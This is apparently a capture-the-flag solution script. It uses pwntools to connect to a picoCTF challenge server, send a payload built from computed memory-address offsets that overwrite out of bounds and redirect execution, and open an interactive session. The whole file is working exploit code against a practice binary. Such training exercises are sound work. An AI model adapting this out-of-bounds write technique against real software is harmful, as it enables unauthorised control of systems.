from pwn import *

r = remote('saturn.picoctf.net', 56524)
#r = process('/tmp/vuln')
payload = b'\xff' * (1337 // 0xff)
payload += bytes([1337 % 0xff])
payload += b'\n'
payload += str(int((0x0804c040 - 0x0804c080) / 4)).encode('ascii') 
payload += b' '
payload += str(0x080492fc - 0x08049436 + (0x08049465 - 0x08049436)).encode('ascii')
payload += b'\n'
print(payload)
r.send(payload)
r.interactive()
